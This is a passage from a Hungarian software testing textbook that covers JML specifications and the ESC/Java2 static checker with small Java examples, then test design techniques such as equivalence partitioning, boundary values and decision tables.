signals_only kulcsszó után adható meg, hogy milyen kivételt válthat ki a metódus.
Az fenti példában van egy BankSzámla osztályunk, amelyben a balansz mezõ tárolja, hogy mennyi
pénzünk van. Az invariánsunk az fejezi ki, hogy a balansz nem lehet negatív. Négy metódusunk van.
A metódusoknál megadjuk elõ- és utófeltételüket természetes nyelven:
 betesz(összeg)
 Elõfeltétel: Az összeg pozitív szám, mert nulla forintot nincs értelme betenni, negatív
összeget pedig nem szabad.
 Keret feltétel: Csak a balansz mezõt írhatja.
 Utófeltétel: A balanszot meg kell növelni az összeggel, azaz az új balansz a régi balansz
plusz az összeg.
 kivesz(összeg)
 Elõfeltétel: Az összeg pozitív szám, mert nulla forintot nincs értelme kivenni, negatív
összeget pedig nem szabad. Továbbá az összeg kisebb egyenlõ, mint a balansz, mert a
számlán lévõ összegnél nem lehet többet felvenni.
 Keret feltétel: Csak a balansz mezõt írhatja.
 Utófeltétel: A balanszot csökkenteni kell az összeggel, azaz az új balansz a régi balansz
mínusz az összeg.
 zárol() 
3-11
 Elõfeltétel: Nincs, azaz mindig igaz.
 Keret feltétel: Csak a zárolt mezõt írhatja.
 Utófeltétel: A zárolt mezõnek igaznak kell lennie.
 getBalansz()
 Két esetet különböztetünk meg, ahol az elõfeltételek kizárják egymást.
 Elõfeltétel: A számla nem zárolt.
 Utófeltétel: A visszatérési érték megegyezik a balansz értékével.
 Elõfeltétel: A számla zárolt.
 Kivétel: Zárolt számla nem kérdezhetõ le, ezért BankingException kivételt kell dobni.
 Keret feltétel: Mindkét esetben egyik mezõ sem írható, tehát ez a metódus „pure”.
A JML nyelvhez több segédeszköz is létezik. Az elsõ ilyen az Iowa State University JML program. Ez
a következõ részekbõl áll:
 jml: JML szintaxis ellenõrzõ
 jmlc: Java és JML fordító, a Java forrásban lévõ JML specifikációt belefordítja a bájtkódba.
 jmlrac: a jmlc által instrumentált bájtkódot futtató JVM, futtatás közben ellenõrzi a
specifikációt, tehát dinamikus ellenõrzést végez.
Nekünk a JML 5.4 és 5.5 verziót volt szerencsénk kipróbálni. Sajnos ezek csak a Java 1.4 verzióig
támogatják a Java nyelvet. Nem ismerik például a paraméteres osztályokat. Ha simán hívjuk meg a
jmlc parancsot, akkor rengeteg információt kiír, ami esetleg elfed egy hibát. Ezért érdemes a -Q
vagy a -Quite opcióval együtt használni. A BankSzámla példát a következõ utasításokkal lehet
ellenõrizni, hogy megfelel-e specifikációjának:
jmlc -Q BankSzámla.java
jmlrac BankSzámla
Persze ehhez a BankSzámla osztályba kell írni egy main metódust is, hiszen az a belépési pont.
Második példa:
//******* AbstractAccount.java *******
package bank3; 
3-12
public abstract class AbstractAccount {
 //@ public model int balance;
 //@ public invariant balance >= 0;
 //@ requires amount > 0;
 //@ assignable balance;
 //@ ensures balance == \old(balance + amount);
 public abstract void credit(int amount);
 //@ requires 0 < amount && amount <= balance;
 //@ assignable balance;
 //@ ensures balance == \old(balance) - amount;
 public abstract void debit(int amount);
 //@ ensures \result == balance;
 public abstract /*@ pure @*/ int getBalance();
}
//******* Account.java *******
package bank3;
public class Account extends AbstractAccount{
 private /*@ spec_public @*/ int balance = 0; //@ in
super.balance;
 //@ private represents super.balance = balance;
 public void credit(int amount) { balance += amount; }
 public void debit(int amount) { balance -= amount; }
 public int getBalance() { return balance; }
}
Ez a példa azt mutatja meg, hogyan lehet már az interfészben vagy az absztrakt õs osztályban
specifikálni az elvárt viselkedést. Ehhez egy modell mezõt kell definiálni az õsben (vagy az
interfészben) a „model” kulcsszóval. A konkrét gyermekben az õsben specifikált viselkedést meg
kell valósítani. Ehhez meg kell mondani, hogy melyik konkrét mezõ valósítja meg a modell mezõt.
Ez a „represents” kulcsszó használatával lehetséges. 
3-13
A fenti példát a következõ utasításokkal lehet ellenõrizni:
 jmlc -Q bank3/*.java
jmlrac bank3.Account
Persze ehhez a Account osztályba kell írni egy main metódust is, hiszen az a belépési pont.
Harmadik példa:
//******* Timer.java *******
package bank4;
public interface Timer{
 //@ public instance model int ticks;
 //@ public invariant ticks >= 0;
 //@ assignable this.ticks;
 //@ ensures this.ticks == ticks;
 void setTimer(int ticks);
}
//******* Dish.java *******
package bank4;
public class Dish implements Timer{
 private /*@ spec_public @*/ int timer; //@ in ticks;
 //@ private represents ticks = timer;
 public void setTimer(int timer) { this.timer = timer;}
}
Ez a példa azt mutatja meg, hogyan kell modell mezõt létrehozni az interfészben. Mindent
ugyanúgy kell csinálni, csak a „model” kulcsszó elé be kell írni az „instance” kulcsszót, ami azt fejezi
ki, hogy a modell változó példány szintû. Erre azért van szükség, mert egyébként Javában minden
interfész mezõ statikus.
Láttuk, hogy a specifikáció dinamikus ellenõrizhetõ az Iowa State University JML programmal.
Szerencsére lehetséges a statikus ellenõrzés is az ESC/Java2 programmal.
Az ESC/Java2 (Extended Static Checker for Java2) egy olyan segédeszköz, amely ellenõrizni tudja,
hogy a Java forrás megfelel-e a JML specifikációnak. Az ESC/Java2 hasonlóan a FindBugs 
3-14
programhoz figyelmezteti a programozót, ha null referenciára hivatkozik, vagy más gyakori
programozói hibát vét. Erre akkor is képes, ha egy JML sor specifikációt se írunk. Nyilván, ha
kiegészítjük a kódunkat JML specifikációval, akkor sokkal hasznosabban tudjuk használni.
Az ESC/Java2 program is csak a Java 1.4 verziójáig támogatja a Java nyelvet. Ez is telepíthetõ
Eclipse pluginként a http://kind.ucd.ie/products/opensource/Mobius/updates/ címrõl.
Miután feltelepítettük két új perspektívát kapunk, a Validation és a Verification nevût. Az elsõben
3 új gombban bõvül a menüsor alatti eszköztár. Ezek a következõek: JML, JMLC, és a JMLRAC gomb,
amelyek az azonos nevû segédprogramot hívják az Iowa State University JML programcsomagból.
A második perspektívában 5 új gombot kapunk. Ezek közül a legfontosabb az elsõ, amely elindjtja a
ESC/Java2 ellenõrzõ programot. A többi gomb balról jobbra haladva a következõk: jelölõk
(jelölõknek nevezzük a hiba helyét jelölõ piros ikszet) törlése, ugrás jelölõre, ellenörzés
engedélyezése, ellenõrzés tiltása. Ezeket nem találtuk különösebben hasznosnak. Ami hasznos volt
számunkra az az ESC/Java2 menüben található Setup menü. Itt lehet bekapcsolni az automatikus
ellenõrzést, aminek hatására minden egyes mentés után lefut az ESC/Java2.
Nézzünk egy egyszerû példát, amikor JML specifikáció nélkül is hibát fedez fel a kódunkban az
ESC/Java2.
package probe;
public abstract class Decorator extends Car {
 Car target;
 public int getSpeed(){
 return target.getSpeed();
 }
}
Itt az ötödik sorra azt a hibát kapjuk, hogy „Possible null dereference (Null)”. Ez a figyelmeztetés
teljesen jogos, segíti a programozót kijavítani egy hibát.
Nézzük meg azt a példát, amivel a FindBugs nem boldogult:
public static void main(String[] args){
Object o = null;
int i = 1;
if(i == 1) o = "hello";
 System.out.println(o.toString());
}
Erre az ESC/Java2 semmilyen hibát nem ad. Ez azért lehetséges, mert mögötte egy automatikus
tételbizonyító áll, ami meg tudja nézni, hogy valamely feltétel igaz vagy sem az egyes lehetséges
végrehajtási utakon. 
3-15
Ugyanakkor a ESC/Java2-höz adott Simplify nevû automatikus tételbizonyító nem túl okos. Például
nem tudja, hogy két pozitív szám szorzata pozitív, ezért ad hibát a következõ példára:
public class Main {
 //@ requires n>=0;
 //@ ensures \result > 0;
 public int fact(int n){
 if (n==0) return 1;
 return n*fact(n-1);
 }
}
Itt az ESC\Java2 hibásan a „Postcondition possibly not established (Post)” figyelmeztetést adja,
pedig a függvény tökéletesen betartja az utófeltételét. Szerencsére az ESC\Java2 alatt kicserélhetõ
az automatikus tételbizonyító. 
3-16
Tartalomjegyzék
3 Statikus tesztelési technikák ...................................................................... ............................................. 3-1
3.1 Felülvizsgálat.................................................................................... ............................................... 3-1
3.1.1 Informális felülvizsgálat ........................................................................... ............................... 3-2
3.1.2 Átvizsgálás ...................................... ................................................... ..................................... 3-2
3.1.3 Technikai felülvizsgálat ............................................................................ ............................... 3-4
3.1.4 Inspekció ........................................ ................................................... ...................................... 3-5
3.2 Statikus elemzés ................................................................................. ............................................ 3-6
3.2.1 Statikus elemzés csak a forráskód alapján ........................................................... .................. 3-7
3.2.2 Statikus elemzés a forráskód és modell alapján ...................................................... ............... 3-8 
Szoftver tesztelés
4-1
4 Teszt tervezési technikák
Az elõzõ fejezetben áttekintettük a statikus tesztelési technikákat. Ezek a módszerek nem
igénylik a tesztelendõ rendszer futtatását, sõt bizonyos esetekben még a forráskód meglétét
sem.
A dinamikus tesztelési technikák viszont a tesztelendõ rendszer futtatását igénylik. Ebben a
fejezetben a dinamikus tesztek tervezési kérdéseivel foglalkozunk. Definiáljuk a szükséges
fogalmakat, megismerjük a teszt tervezési technikák megközelítési módjait, áttekintjük a
legelterjedtebb specifikáció alapú, struktúra alapú és gyakorlat alapú tesztelési technikákat,
majd megvizsgáljuk az egyes technikák közötti választás szempontjait.
A dinamikus tesztelési technikák elsõsorban a komponens teszt, azon belül is fõleg a unitteszt (egységteszt) fázis eszköze.
Mivel a teszteléssel kapcsolatos magyar nyelvû irodalom máig is igen kevés, az érdeklõdõbb
hallgatók elsõsorban az angol nyelvû szakirodalom tanulmányozása során juthatnak új
ismeretekhez. Ennek megkönnyítésére a fontosabb fogalmak elsõ elõfordulása során annak
angol nyelvû megnevezését is közöljük.
4.1 Alapfogalmak
A dinamikus tesztek tervezése alapvetõen az alábbi három lépésbõl áll:
• A tesztelés alanyának, céljának meghatározása (test condition)
• Tesztesetek (test cases) specifikálása
• Teszt folyamat (test procedure) specifikálása
A tesztelési folyamathoz kapcsolódnak még a teszt készlet (test suite), hibamodell és
lefedettség (test coverage) fogalmak is.
4.1.1 Tesztelés alanya (test condition)
A tesztelés alanya lehet rendszer egy olyan jellemzõje, amely ellenõrizhetõ egy vagy több
teszt esettel. Ilyen lehet például:
• funkció,
• tranzakció,
• képesség (feature),
• minõségi jellemzõ,
• strukturális elem. 
Szoftver tesztelés
4-2
4.1.2 Teszteset
Egy teszteset az alábbi összetevõkbõl áll:
• végrehajtási prekondíciók (preconditions)
• input értékek halmaza
• elvárt eredmény
• végrehajtási posztkondíciók (postconditions)
Egy teszteset célja egy meghatározott vezérlési út végrehajtatása a tesztelendõ program
egységben, vagy egy meghatározott követelmény teljesülésének ellenõrzése.
Egy teszteset végrehajtása esetén a rendszert egy megadott kezdõ állapotban kell hozni
(prekondíciók), megadott input értékek halmazával végre kell hajtatni a tesztelt elemet,
majd a teszt futásának eredményét össze kell hasonlítani az elvárt eredménnyel és
ellenõrizni kell, hogy a végrehajtás után a rendszer az elvárt állapotba (posztkondíciók)
került-e.
Példaként tételezzünk fel egy olyan program modult, amely a felhasználótól bekér néhány
adatot, és megnyomja a „Számolj”gombot. A modul a megadott adatokat és adatbázisban
tárolt egyéb értékeket felhasználva elvégez valamilyen számítást, majd az eredményeket
adatbázisba menti. Ennek a modulnak egy tesztesete tartalmazza:
• a felhasználói adatokat (input értékek halmaza),
• a számítás helyes eredményét (elvárt eredmény),
• prekondícióként azt, hogy a felhasználó megnyomta a „Számolj” gombot, és az
adatbázis tartalmazza a számításhoz szükséges értékeket,
• posztkondícióként, hogy a számítás eredményei bekerültek az adatbázis megfelelõ
tábláiba.
4.1.3 Teszt specifikáció
Egy teszteset végrehajtásához szükséges tevékenységek sorozatának a leírása. Szokás teszt
forgatókönyvnek (manual test script) is nevezni.
4.1.4 Tesztkészlet
Egy tesztkészlet tesztesetek és hozzájuk tartozó teszt specifikációk halmaza. Csoportosítható
egy teszt alanyra, vagy egy vizsgált hibára.
A tesztkészletet megfelelõ módon archiválni kell, mert egy tesztkészletet a fejlesztés során
többször is végre kell hajtani, sõt, a rendszer késõbbi változtatásainál is szerepet kap, annak
ellenõrzésére használható, hogy a változtatás hatására nem keletkezett-e újabb hiba. 
Szoftver tesztelés
4-3
4.1.5 Hibamodell
Azon (feltételezett) szoftver hibák halmaza, amelyre a teszt tervezés irányul. A tesztesethez
kapcsolódó példához a hibamodell azt rögzítheti, hogy az alábbi hibák következhetnek be:
• számítási hibák,
• adatbázis lekérdezési hibák (rossz adatokat használunk fel a számításhoz),
• az adatbázisba módosításának hibák (a számítás eredménye rosszul kerül be az
adatbázisba).
A hibamodell a tesztesetek tervezéséhez ad támpontokat.
4.1.6 Teszt folyamat
Egy rendszer teljes tesztelésének megtervezéséhez (ami a teszt menedzsment egyik feladata,
így a következõ fejezetben foglalkozunk vele részletesebben), az alábbiakat foglalja
magában:
• a szükséges tesztelési célok meghatározása,
• minden tesztelési célhoz a szükséges tesz készlet definiálása
• az egyes teszt készletekben foglalt tesztek ütemezésének és a végrehajtásuk
dokumentálásának megtervezése.
A teszt folyamat terve a rendszer specifikációjának egy fejezete lehet, de összetettebb
rendszerek esetén általában külön teszt specifikáció készül.
4.1.7 Teszt lefedettség
A teszt lefedettség a számszerû értékelése annak, hogy a tesztelési tevékenység mennyire
alapos, illetve hogy egy adott idõpontban hol tart. A „Már majdnem kész vagyok, fõnök!” és
a „Három hete ezen dolgozom, fõnök!” meglehetõsen szubjektív mértékek. (Nem tudom
megállni ezen a ponton, hogy ne idézzem a szoftverfejlesztés egyik alapvetõ „természeti
törvényét”: egy szoftver projekt a rendelkezésre álló idõ 90%-ában 90%-os készültségi fokon
áll…)
Amióta felismertük, hogy a tesztelés a fejlesztési folyamat fontos (és sajnos erõforrás
igényes, tehát költséges) része, folyamatosan keressük a folyamat elõrehaladásának a mérési
lehetõségeit.
A teszt lefedettség számszerûsítése alkalmas a tesztelési tevékenységet értékelésére az
alábbi szempontok szerint:
• Lehetõséget ad a tesztelési tevékenység minõségének mérésére. 
Szoftver tesztelés
4-4
• Lehetõség biztosít arra, hogy megbecsüljük, ennyi erõforrást kell még a fejlesztési
projekt hátralevõ idejében tesztelési tevékenységre fordítani.
Az egyes tesztelési technikák más és más lefedettségi mérõszámokat alkalmaznak. A
specifikáció alapú technikák esetén arra adhatnak választ, hogy a követelmények milyen
mértékben lettek tesztelve, a struktúra alapú technikák esetén pedig, hogy a kód milyen
mértékben lett ellenõrizve.
A lefedettségi mérõszámok tehát arra nézve adnak információt, hogy milyen készültségi
szinten áll a tesztelési tevékenység, és a tesztelési terv részeként meghatározzák, hogy
milyen feltételek esetén tekinthetjük a tevékenységet késznek.
4.2 A teszt tervezési technikák fajtái
A szoftver technológia kialakulása óta számos teszt tervezési technika alakult ki. Ezek
különböznek a hatékonyságuk, implementálásuk nehézsége, az elméleti háttér és a
mindennapi fejlesztési gyakorlatból leszûrt heurisztikák arányában.
Ha áttekintjük a számos publikált technikát és értékeljük ezeket a gyakorlati alkalmazhatóság
szempontjából, akkor a technikákat három lényeges csoportba sorolhatjuk:
• Specifikáció alapú technikák. Ezek a módszerek a teszteseteket közvetlenül a
rendszer specifikációjából (modelljébõl) vezetik le. Black-box technikáknak is
nevezzük ezeket, mert az egyes szoftver modulok belsõ szerkezetének ismerete
nélkül, az egyes modulok által teljesítendõ funkcionalitások alapján tervezhetjük meg
a teszt eseteket.
• Modell alapú technika (Model-driven testing). Valójában az elõzõ csoportba tartozik,
csak formalizáltabb technika. Közvetlenül az UML modellbõl vezeti le a teszteseteket,
és formalizált teszt specifikációt alkalmaz. Erre használható az UML kiterjesztése.
(UTP – UML Testing Profile.)
• Struktúra alapú technikák. Ezek a módszerek a kód ismeretében határozzák meg a
teszteseteket. White-box technikáknak is nevezzük.
• Gyakorlat alapú technikák. A tesztelõknek a munkájuk során megszerzett
tapasztalatira épülõ, a szakmai intuíciókat is értékesítõ technikák.
Természetesen léteznek olyan teszt tervezési módszerek is, amelyek egyik fenti kategóriába
sem sorolhatók be, azonban a gyakorlatban alkalmazott módszerek összefogására a jelen
jegyzet szintjén ezek a kategóriák beváltak.
A továbbiakban ennek a csoportosításnak megfelelõen foglaljuk össze az ismertebb
technikákat.
4.3 Specifikáció alapú technikák
Ezek a technikák a tesztelés alapjaként a rendszer specifikációját, esetleg formális modelljét
tekintik. Amennyiben a specifikáció jól definiált és megfelelõen strukturált, ennek elemzése 
Szoftver tesztelés
4-5
során könnyen azonosíthatjuk a tesztelés alanyait (test conditions), amelyekbõl pedig
származtathatjuk a teszteseteket.
A specifikáció soha nem azt rögzíti, hogy hogyan kell a rendszernek megvalósítania az elvárt
viselkedést (ennek meghatározása a tervezés feladata), csak magát a viselkedést definiálja. A
specifikáció és a tervezés a fejlesztés folyamatában is külön fázist képviselnek, és gyakran a
fejlesztõ csoporton belül nem is ugyanazok a részvevõk végzik. A specifikációs fázis
legtöbbször megelõzi a tervezési fázist. Ez lehetõvé teszi a munkafolyamatok
párhuzamosítását: a specifikáció alapján a tesztmérnökök kidolgozhatják a teszteseteket
miközben a rendszer tervezése és implementálása folyik. Ha az implementáció elkészül, a
már kész tesztesetek futtatásával lehet ellenõrizni.
A tevékenységek ilyen párhuzamosítása a fejlesztés átfutási idejének rövidítésén túl a
specifikáció ellenõrzésére is alkalmas. Ha ugyanis egy, a mûködõ program ismerete nélkül,
csak a specifikáció elemzése alapján megtervezetett teszteset hibát mutat ki, annak két oka
lehet
• a tervezés vagy az implementáció során a fejlesztõk által elkövetett hiba,
• ugyanazt a követelményt a teszt mérnök és a tervezõ másként értelmezte – ez a
specifikáció hibája.
Nem minden fejlesztési projekt alapul pontosan definiált specifikáción. Ebben az esetben a
specifikáció alapú tesztesetek megtervezése, illetve a tervezéshez szükséges információk
megszerzése párhuzamosan, egymástól elkülönítve történhet, ami többlet erõforrások
felhasználását, és a félreértések esélyének növekedését jelenti.
Van azonban olyan eset is, amikor a formális specifikáció hiánya nem jelenti a tesztelési
tevékenység megnehezítését. Az agilis fejlesztési szemlélet ugyanis nem követeli meg
formális specifikáció elkészítését. Ez a megközelítés azonban éppen a tesz tervezés
fontosságát emeli ki: a specifikáció szerepét a tesztesetek veszik át: a fejlesztés során elõször
egy funkcióhoz tartozó teszteseteket kell megtervezni. Az implementációs fázis befejezését
az jelenti, ha az összes (elõre megtervezett) teszteset hiba kimutatása nélkül fut le.
A tesztelési technikák ismertetése során többször fogunk hivatkozni az alábbi
„specifikációkra”:
S1: Készítsünk programot, amely beolvas egy egész számot, és kiírja, hogy az negatív, pozitív,
vagy nulla-e.
S2: Készítsünk programot, amely beolvas három egész számot, amelyek egy háromszög
oldalhosszait reprezentálják. A feladat annak megállapítása, hogy a bemeneti adatok
általános, egyenlõszárú vagy egyenlõ oldalú háromszöget alkotnak-e.
A tesztelési folyamat nehézségére utal, hogy ennek a nagyon egyszerû specifikációnak
megfelelõ programnak a korrekt ellenõrzésére is számos teszt esetet kell definiálnunk. 
Szoftver tesztelés
4-6
A továbbiakban áttekintjük a legismertebb specifikáció alapú tesztelési technikákat.
4.3.1 Ekvivalencia particionálás (Equivalence partitioning)
Ennek a technikának az alapja az a megfigyelés, hogy vannak olyan különbözõ input értékek,
amelyekre a programnak ugyanúgy kell viselkednie.
Ekvivalencia osztálynak nevezzük az input értékek olyan halmazát, amelyre ugyanúgy kell
viselkednie a programnak. Ez azt jelenti, hogy egy ekvivalencia osztályhoz elég egy teszt
esetet megtervezni és lefuttatni, mert az osztályhoz tartozó lehetséges tesztesetek
• ugyanazt a hibát fedhetik fel,
• ha egy teszteset nem fed fel egy hibát, azt az osztályhoz tartozó más tesztesetek sem
fogják felfedni.
Az ekvivalencia osztályok meghatározása jelentõsen csökkentheti a szükséges tesztesetek
számát. Az S1 specifikációnak megfelelõ program kimerítõ tesztelése esetén a tesztesetek
száma az ábrázolható egész számok számával azonos. Nyilvánvalóan azonban a tesztesetek
száma háromra korlátozható, mert feltételezhetõ, hogy ha a program az 1 bemenetre a
„pozitív” választ adja, akkor 23458-re is azt fogja adni.
Az ekvivalencia osztályok meghatározása heurisztikus folyamat. Meghatározásuk során meg
kell keresnünk az érvényes és az érvénytelen bemenetek osztályát is.
Az S1 specifikáció matematikai értelmezése szerint nem lehetnének érvénytelen bemenetek,
hiszen minden egész szám besorolható a specifikáció szerinti kategóriák valamelyikébe. Egy
számítógépes program azonban nem képes az egész számok teljes halmazát leképezni, így
meg kell vizsgálni azt az esetet, hogy ha az input olyan egész számot tartalmaz, ami az
ábrázolási tartományok kívülre esik.
Az ekvivalencia osztályok átfedhetik egymást. Ennek felismerése tovább csökkentheti a
szükséges tesztesetek számát, hiszen a közös részhalmazból választott teszteset az átfedett
osztályok mindegyikére érvényes.
Az S2 specifikációra ekvivalencia osztályok lesznek például
• három olyan pozitív szám, ami általános háromszöget alkot (érvényes ekvivalencia
osztály)
• Az egyik szám negatív (nem érvényes ekvivalencia osztály)
• stb.
4.3.2 Határérték analízis (Boundary value analysis)
Ennek a technikának az alapja az a megfigyelés, hogy a határértékek kezelésénél
könnyebben követnek el hibát a programozók, mint az „általános” eseteknél. 
Szoftver tesztelés
4-7
Célszerû tehát az ekvivalencia osztályok határértékeit külön megvizsgálni.
Az S2 specifikáció esetén ilyen határértékek például:
• két szám összege egyenlõ a harmadikkal
• mindhárom szám 0
Figyelni kell a kimeneti ekvivalencia osztályok határértékeit is. Ehhez persze sokszor
"visszafelé" kell gondolkodni, tehát meg kell határozni azon input értékek halmazát, amelyek
határértékként kezelhetõ kimeneteket produkálnak.
Tipikus probléma a konténer típusú adatszerkezetek elemszáma, vagy a sorszámozott típusú
adatszerkezetek "végei"!
Példaként vegyük egy program modult, amelynek feladata egy minta megkeresése egy
sorozatban. A határérték analízis során megtalálható tesztesetek:
• 0 hosszúságú sorozat
• 1 hosszúságú sorozat, a minta nincs benne / a minta benne van
• >1 hosszúságú sorozat, a minta az elsõ / utolsó helyen van
• 2 hosszúságú sorozat (nincs benne / elsõ /utolsó)
• nagyon nagy elemszámú sorozat
4.3.3 Ok-hatás analízis (Cause-effect analysis)
Ez a technikai egy döntési táblát épít fel, amelynek az oszlopai adják meg a definiálandó
teszteseteket, ezért döntési tábla (decision table) technikának is nevezik.
A módszer alapgondolata az, hogy a specifikáció gyakran olyan formában írja le a rendszer
által megvalósítandó üzleti folyamatokat, hogy az egyes tevékenységeknek milyen bemeneti
feltételei vannak. Az elõzõ két módszer nem vizsgálja a bementi feltételek kombinációit.
A bemeneti feltétel (ok) lehet például:
• egy input adat valamilyen értékére vonatkozó elõírás,
• input adatok egy ekvivalencia osztálya,
• valamilyen felhasználói akció vagy egyéb esemény bekövetkezése stb.
A kimeneti feltétel (hatás) megmondja, hogy az okok egy kombinációjára a rendszernek
milyen állapotot kell elérnie.
A bementi és kimenti feltételekhez logikai érték rendelhetõ. (Teljesül-e: igen-nem). Ez a
megközelítés a rendszert egy logikai hálózatnak tekinti, ahol a lehetséges bemenetekhez a
specifikáció által megadott szükséges kimeneteket rendeljük hozzá. Ennek a logikai
hálózatnak az igazságtáblája egy döntési táblázatban ábrázolható. A táblázat soraiban az 
Szoftver tesztelés
4-8
okokat és a hatásokat soroljuk fel, a cellákban pedig azok logikai értéke található. A táblázat
minden egyes oszlopa egy megvalósítandó teszt esetet definiál.
Lássunk erre egy egyszerû példát:
Egy áruház pontgyûjtõ kártyát bocsát ki. Minden vásárló, akinek van ilyen kártyája, minden
vásárlása során dönthet, hogy 5% kedvezményt kér a számla összegébõl, vagy a kártyán lévõ
pontjait növeli meg. Az a vásárló, akinek nincs ilyen kártyája, szintén megkaphatja az 5%
kedvezményt, ha 50.000 Ft felett vásárol.
A bemeneti feltételek (okok) ebben az esetben:
• Van-e pont pontgyûjtõ kártya?
• Kéri-e a kártyatulajdonos a kedvezményt?
• 50.000 Ft felett van-e a vásárlás összege?
A kimeneti feltételek (hatások):
• Nincs kedvezmény
• Kedvezmény jóváírása
• Pontok jóváírása
A döntési tábla:
T1 T2 T3 T4
Okok:
O1 Van-e pontgyûjtõ kártya? I I H H
O2 Kéri-e a kártyatulajdonos a
kedvezményt?
H I - -
O3 50.000 Ft felett van-e a vásárlás
összege?
- - H I
Hatások:
H1 Nincs kedvezmény I H I H
H2 Kedvezmény jóváírása H I H I
H3 Pontok jóváírása I H H H
A táblázatban az Igaz – Hamis logikai értékek mellett megjelenik a – jel is, amelynek kétféle
jelentése lehet:
• a bemeneti feltételt a többi feltétel adott állapota kizárja (mint az O2 sorban),
• a kimeneti feltétel a többi feltétel adott állapota mellett független a bemeneti
feltétel állapotától (mint az O3 sorban).
Ez a jelölés (amely egyfajta háromértékû logikát használ) csökkenti az oszlopok (és ezzel a
szükséges tesztesetek) számát. 
Szoftver tesztelés
4-9
Ha a döntési táblát egy logikai hálózat igazságtáblázatának tekintjük, a bementi feltételek
összes lehetséges kombinációit tartalmaznia kellene. Ezek száma, tehát a döntési tábla
oszlopainak a száma igen nagy lehet. A teszt tervezés számára hasznos döntési táblában az
oszlopos számát csökkentheti:
• a példában is alkalmazott „háromértékû logika” használata,
• az a tény, hogy a specifikáció szerint egyes bemeneti feltételek egymást kizárhatják,
• nem minden lehetséges bemeneti feltétel kombinációhoz tartozik hatás.
A teljes döntési táblától megkülönböztetve az így kapott táblázatot szûkített döntési
táblázatnak (limited entry decision table) nevezzük.
A specifikációból elõállított döntési tábla, amellett hogy jól áttekinthetõ kiindulópontja lehet
a tesztesetek tervezésének, „mellékhatásként” alkalmas a specifikáció konzisztenciájának és
teljességének az ellenõrzésére is, ezáltal a specifikáció tesztelésének is eszköze. A
specifikáció hiányosságaira utalhat például az, hogy táblázatban tudunk olyan oszlopot
elõállítani, amelyben a bemeneti feltételeknek egy, a valóságban elõfordulható kombinációja
található, de nem tartozik hozzá a specifikációban hatás. (Hiányos specifikáció.)
A döntési tábla elõállításának van egy formális módszere, amely fõleg nagy méretû
táblázatok esetén lehet hasznos. Ehhez ismét abból kell kiindulni, hogy a rendszert egy
logikai hálózatként tekinthetjük, ahol a bementi feltételek, a döntésekhez szükséges
közbensõ feltételek és a kimenetet jelentõ hatások a hálózat elemei. Az ilyen hálózatokat az
úgynevezett bool gráffal ábrázolhatjuk. A bool gráf jellemzõi:
• Csomópontjai a 0 vagy 1 (igaz/hamis) értékeket vehetik fel.
• Az irányított élek logikai mûveleteket jelentenek
• Egy csomópont értékét a befutó élek kiindulási csomópontjainak értéke, és a
csomóponthoz rendelt mûvelet határozza meg.
• A gráfban minden ok és minden hatás egy csomópontként jelenik meg, ezek között
lehetnek közbensõ állapotok.
• Az okokban megfelelõ csomópontokhoz csak kiinduló élek tartoznak.
• A hatásoknak megfelelõ csomópontokból nem indulhatnak ki élek.
A bool gráf alapelemeinek egy lehetséges jelölésmódja: 
Szoftver tesztelés
4-10
4-1. ábra A bool gráf jelölésrendszere
A gráfot a specifikációból építjük fel, az alábbiak szerint:
• ok: egy bemeneti feltétel vagy egy bemeneti ekvivalencia osztály
• hatás: a kimeneti feltétel
• minden ok és hatás egy számot kap
• a tartalmat elemezve építjük fel a gráfot
• feljegyezzük azokat a feltételeket, amelyeket nem tudtunk a gráffal ábrázolni.
A gráfból elõállítjuk annak igazságtáblázatát, az alábbiak szerint
• A cellákban 0 vagy 1 szerepel
• A sorok az okok és a hatások
• Az oszlopok számát az adja meg, hogy hány lehetséges bemeneti kombináció tudja
elõidézni legalább egy kimenet 1 értékét.
• Az oszlopok számát csökkentheti, ha a hatásokra kirótt korlátozásokat figyelembe
vesszük.
• A hatásokból kiindulva ("visszafelé") töltjük ki a táblázatot.
Az igazságtáblából a tesztesetek levezetése (azaz a szûkített döntési tábla elõállítás) az alábbi
lépésekbõl áll:
• Kitöröljük azokat az oszlopokat, amelyek ütköznek az okokra feljegyzett
korlátozásokkal
• A maradék oszlopok egy-egy tesztesetnek felelnek meg, ahol
o az okok soraiban 0 a feltételnek nem megfelelõ adatot, 1 a feltételnek
megfelelõ adatot jelent,
o a hatások 0 – 1 értékei adják az elvárt eredményt. 
Szoftver tesztelés
4-11
4.3.4 Véletlenszerû adatok generálása
Ez a technika azon alapul, hogy automatikusan, véletlenszerûen állítunk elõ bemeneti
adatokat, és ezekkel futtatjuk a tesztelendõ modult. Bár ennek a módszernek a hibafeltáró
képessége is véletlenszerûnek tûnik, számos szempont szól az alkalmazása mellett:
• Kis erõforrás igény.
• Viszonylag könnyen automatizálható.
• Nagytömegû adattal tesztelhetõ a modul/rendszer.
• A "vak tyúk is talál szemet" elv alapján esetleg olyan hibára is fényt deríthet, amelyre
a determinisztikus tesztek tervezése során nem gondoltunk.
• Ez a módszer használható "monkey test"-ként, amellyel a próbálkozó felhasználó
viselkedéséhez hasonló hatást érhetünk el.
• Terhelési tesztre is alkalmas lehet.
A véletlenszerû adatok generálása mindig egy adott tartományba esõ (általában egyenletes
eloszlású) számok elõállítását jelentik. A tartomány lehet az adott adat érvényességi
tartomány, vagy éppen azon kívüli (ebben az esetben a rendszernek a hibás bemenetekre
adott válaszát tesztelhetjük).
Terhelési tesztként használva gyakran lehet becslésünk arról, hogy a bemenetei adatok az
éles használat esetén milyen eloszlást követnek, ilyenkor az egyenletes eloszlás helyett a
becsült eloszlásnak megfelelõ adatokat generálhatunk.
A véletlenszerû teszt generálás esetén sajátos problémaként jelenik meg a kimenetek
ellenõrzése. Mivel ez automatizálást feltételezõ módszer, az elvárt kimentek elõállítása és
azoknak a teszt eredményekkel való összehasonlítása is automatizáltan kell történjen. Ez a
probléma a többi technika esetén is felmerül, ezért erre a késõbbiekben még visszatérünk.
Ennél a módszernél azonban az is felmerülhet, hogy nem is vizsgáljuk a kimenetek
helyességét, ehelyett a rendszer viselkedésére helyezzük a hangsúlyt, és csak arról akarunk
meggyõzõdni, hogy a folyamatos mûködés során nem lépnek fel váratlan események.
4.3.5 Használati eset (use case) tesztelés
A mai fejlesztési projektekben a specifikáció gyakran használt eszköze a használati eset (use
case) modell felépítése. Ilyen esetekben a teszt tervezés vezérfonalát a használati eset
modell elemei alkotják, sõt, a teszteseteket is leírhatjuk használati esetekkel.
Ebben az esetben a használati esetek és a tesztesetek összerendelése hasznos eszköz lehet
